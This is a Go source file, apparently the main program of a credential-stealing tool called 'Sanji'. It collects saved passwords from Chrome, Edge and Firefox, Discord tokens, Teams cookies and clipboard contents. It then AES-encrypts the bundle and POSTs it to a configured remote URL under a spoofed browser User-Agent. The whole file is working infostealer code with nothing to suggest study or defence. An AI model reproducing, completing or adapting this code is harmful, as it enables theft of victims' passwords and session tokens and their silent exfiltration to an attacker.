package main

import (
	"Sanji/core"
	"Sanji/utils"
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
)

type FinalPayload struct {
	PayloadAppends `json:"Sanji"`
}

type PayloadAppends struct {
	ChromePayload    []core.ChromePasswords   `json:"Chrome"`
	EdgePayload      []core.ChromePasswords   `json:"Edge"`
	FireFoxPayload   []core.FireFoxPasswords  `json:"FireFox"`
	DiscordPayload   []core.DiscordTokens     `json:"Discord"`
	TeamsPayload     []core.TeamsTokens       `json:"Teams"`
	ClipboardPayload []core.ClipboardContents `json:"Clipboard"`
}

func main() {
	// Grabbing config settings
	POSTUrl, AESPassword := config()

	// Create initial JSON structures for each application
	var HTTPPayload FinalPayload
	var ChromeData []core.ChromePasswords
	var FireFoxData []core.FireFoxPasswords
	var DiscordData []core.DiscordTokens
	var TeamsData []core.TeamsTokens
	var EdgeData []core.ChromePasswords

	// Variable declaration for application folders
	AppDataFolder := os.Getenv("LOCALAPPDATA")
	RoamingAppDataFolder := os.Getenv("APPDATA")
	ChromeRootFolder := AppDataFolder + "\\Google\\Chrome\\User Data\\"
	EdgeRootFolder := AppDataFolder + "\\Microsoft\\Edge\\User Data\\"
	FireFoxRootFolder := RoamingAppDataFolder + "\\Mozilla\\Firefox\\Profiles\\*.default-release"
	FireFoxDefaultRelease, _ := filepath.Glob(FireFoxRootFolder)
	DiscordRootFolder := RoamingAppDataFolder + "\\discord\\Local Storage\\leveldb"
	TeamsRootFolder := RoamingAppDataFolder + "\\Microsoft\\Teams"

	// Check if Chrome installed and execute
	_, err := os.Stat(ChromeRootFolder)
	if os.IsNotExist(err) {
	} else {
		ChromeData = core.ChromeStealer(ChromeRootFolder)
	}

	// Check if Edge installed and execute
	_, err = os.Stat(EdgeRootFolder)
	if os.IsNotExist(err) {
	} else {
		EdgeData = core.ChromeStealer(EdgeRootFolder)
	}

	// Check if FireFox installed and execute
	if len(FireFoxDefaultRelease) != 0 {
		_, err = os.Stat(FireFoxDefaultRelease[0])
		if os.IsNotExist(err) {
		} else {
			FireFoxData = core.FireFoxStealer(FireFoxDefaultRelease[0])
		}
	}

	// Check if Discord installed and execute
	_, err = os.Stat(DiscordRootFolder)
	if os.IsNotExist(err) {
	} else {
		DiscordData = core.DiscordStealer(DiscordRootFolder)
	}

	// Check if Teams installed and execute
	_, err = os.Stat(TeamsRootFolder + "\\Cookies")
	if os.IsNotExist(err) {
	} else {
		TeamsData = core.TeamsStealer(TeamsRootFolder)
	}

	// Grab Clipboard data
	ClipboardData := core.ClipboardStealer()

	// Append all output payloads into final JSON payload
	HTTPPayload.PayloadAppends = PayloadAppends{ChromeData, EdgeData, FireFoxData, DiscordData, TeamsData, ClipboardData}
	FinalOutput, _ := json.Marshal(HTTPPayload)

	// Encrypt with specified AES key and POST to specified URL
	EncryptedData := utils.EncryptAES(AESPassword, FinalOutput)
	client := &http.Client{}
	req, _ := http.NewRequest("POST", POSTUrl, bytes.NewBuffer([]byte(EncryptedData)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36")
	client.Do(req)
}
